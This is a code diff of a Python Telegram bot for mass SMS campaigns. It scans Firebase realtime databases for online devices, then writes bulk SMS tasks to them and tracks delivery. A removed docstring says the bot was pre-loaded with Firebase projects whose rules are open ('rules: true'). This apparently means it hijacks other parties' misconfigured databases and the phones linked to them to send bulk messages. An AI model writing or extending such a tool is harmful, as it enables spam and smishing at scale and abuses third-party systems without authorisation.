@@ -1,13 +1,10 @@
 """
 Telegram SMS Blast Bot — Firebase RTDB edition
-===============================================
-Pre-loaded with Firebase RTDB projects (rules: true).
-No service-account upload needed.
 
 Commands:
-  /start  — show online devices across all projects
-  /send   — start a campaign (CSV or raw numbers → message → confirm)
-  /cancel — reset current session
+  /start  — scan all Firebase projects for devices
+  /send   — start a campaign
+  /cancel — reset session
 """
 
 import io
@@ -39,15 +36,12 @@ log = logging.getLogger(__name__)
 
 BOT_TOKEN = os.environ["BOT_TOKEN"]
 
-# ── Conversation states ────────────────────────────────────────────────────────
 WAIT_NUMBERS, WAIT_MESSAGE, WAIT_CONFIRM = range(3)
 
 KEY_DEVS = "devices"
 KEY_NUMS = "numbers"
 KEY_MSG  = "sms_text"
 
-
-# ── Phone helpers ──────────────────────────────────────────────────────────────
 
 def normalize_phone(raw: str) -> str | None:
     raw = re.sub(r"[\s\-\(\)]", "", raw.strip())
@@ -103,10 +97,8 @@ def confirm_keyboard():
     ]])
 
 
-# ── /start ─────────────────────────────────────────────────────────────────────
-
 async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    msg = await update.message.reply_text("🔄 Scanning all Firebase projects for online devices…")
+    msg = await update.message.reply_text("\U0001f504 Scanning all Firebase projects for online devices…")
 
     devices = await rtdb.discover_all_devices()
     ctx.bot_data[KEY_DEVS] = devices
@@ -116,16 +108,14 @@ async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     capacity        = active_projects * rtdb.MAX_SMS_PER_DB
 
     lines = [
-        f"📦 *{active_projects}/{total_projects}* projects online",
-        f"📱 *{len(devices)}* device(s) found",
-        f"🚀 Capacity this run: *{capacity:,}* SMS",
+        f"\U0001f4e6 *{active_projects}/{total_projects}* projects online",
+        f"\U0001f4f1 *{len(devices)}* device(s) found",
+        f"\U0001f680 Capacity this run: *{capacity:,}* SMS",
         "",
         "Use /send to start a campaign.",
     ]
     await msg.edit_text("\n".join(lines), parse_mode="Markdown")
 
-
-# ── /send entry ────────────────────────────────────────────────────────────────
 
 async def cmd_send(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int:
     devices = ctx.bot_data.get(KEY_DEVS)
@@ -136,7 +126,7 @@ async def cmd_send(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int:
     db_count = len({d.db_url for d in devices})
     capacity = db_count * rtdb.MAX_SMS_PER_DB
     await update.message.reply_text(
-        f"📋 Send phone numbers now.\n"
+        f"\U0001f4cb Send phone numbers now.\n"
         f"Capacity: *{capacity:,}* SMS across *{db_count}* project(s)\n\n"
         "Options:\n"
         "  • Upload *.csv* (column: phone/mobile/number)\n"
@@ -197,12 +187,12 @@ async def receive_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int
     segs     = max(1, -(-chars // 160))
 
     await update.message.reply_text(
-        f"📊 *Campaign Summary*\n\n"
+        f"\U0001f4ca *Campaign Summary*\n\n"
         f"Recipients  : *{len(numbers):,}*\n"
         f"Projects    : *{db_count}* Firebase DBs\n"
         f"Per project : up to *{rtdb.MAX_SMS_PER_DB}* SMS\n"
         f"Msg length  : *{chars}* chars · *{segs}* segment(s)\n\n"
-        f"📝 _Message:_\n`{text[:300]}`\n\n"
+        f"\U0001f4dd _Message:_\n`{text[:300]}`\n\n"
         "Send?",
         parse_mode="Markdown",
         reply_markup=confirm_keyboard(),
@@ -229,7 +219,7 @@ async def handle_confirm(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int:
 
     db_count = len({d.db_url for d in devices})
     prog_msg = await q.edit_message_text(
-        f"🚀 Writing *{len(numbers):,}* SMS tasks to *{db_count}* Firebase projects…",
+        f"\U0001f680 Writing *{len(numbers):,}* SMS tasks to *{db_count}* Firebase projects…",
         parse_mode="Markdown",
     )
 
@@ -243,25 +233,26 @@ async def handle_confirm(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int:
         bar = "█" * (pct // 10) + "░" * (10 - pct // 10)
         try:
             await prog_msg.edit_text(
-                f"📡 Writing tasks…\n`{bar}` {pct}%\n"
+                f"\U0001f4e1 Writing tasks…\n`{bar}` {pct}%\n"
                 f"✅ {written:,}  ❌ {failed:,}",
                 parse_mode="Markdown",
             )
         except Exception:
             pass
 
-    campaign_id, db_task_map = await rtdb.dispatch_campaign(
+    # dispatch_campaign now returns (campaign_tag, task_log list)
+    campaign_tag, task_log = await rtdb.dispatch_campaign(
         devices=devices,
         numbers=numbers,
         text=text,
         progress_cb=on_write_progress,
     )
 
-    total_written = sum(len(v) for v in db_task_map.values())
+    total_written = len(task_log)
 
     await prog_msg.edit_text(
         f"✅ *{total_written:,}* tasks dispatched!\n\n"
-        f"📊 Monitoring delivery…\n"
+        f"\U0001f4ca Monitoring delivery…\n"
         f"_(updates every {rtdb.POLL_INTERVAL}s for up to {rtdb.POLL_TIMEOUT//60}m)_",
         parse_mode="Markdown",
     )
@@ -272,21 +263,22 @@ async def handle_confirm(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int:
         pct = int(grand.sent / grand.total * 100) if grand.total else 0
         bar = "█" * (pct // 10) + "░" * (10 - pct // 10)
         lines = [
-            f"📊 *Live Stats — Campaign* `{campaign_id}`\n",
+            f"\U0001f4ca *Live Stats — Campaign* `{campaign_tag}`\n",
             f"`{bar}` {pct}%\n",
             f"✅ Sent    : *{grand.sent:,}*",
             f"❌ Failed  : *{grand.failed:,}*",
             f"⏳ Pending : *{grand.pending:,}*",
-            f"📦 Total   : *{grand.total:,}*",
+            f"\U0001f4e6 Total   : *{grand.total:,}*",
         ]
         if grand.pending == 0:
-            lines.append("\n🎉 *All tasks resolved!*")
+            lines.append("\n\U0001f389 *All tasks resolved!*")
         try:
             await stat_msg.edit_text("\n".join(lines), parse_mode="Markdown")
         except Exception:
             pass
 
-    await rtdb.poll_stats(db_task_map, campaign_id, update_cb=on_stat_update)
+    # poll_stats now takes (task_log list, campaign_tag)
+    await rtdb.poll_stats(task_log, campaign_tag, update_cb=on_stat_update)
 
     ctx.user_data.clear()
     return ConversationHandler.END
@@ -297,8 +289,6 @@ async def cmd_cancel(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int:
     await update.message.reply_text("Cancelled. /start or /send to begin.")
     return ConversationHandler.END
 
-
-# ── App bootstrap ──────────────────────────────────────────────────────────────
 
 def main():
     app = Application.builder().token(BOT_TOKEN).build()
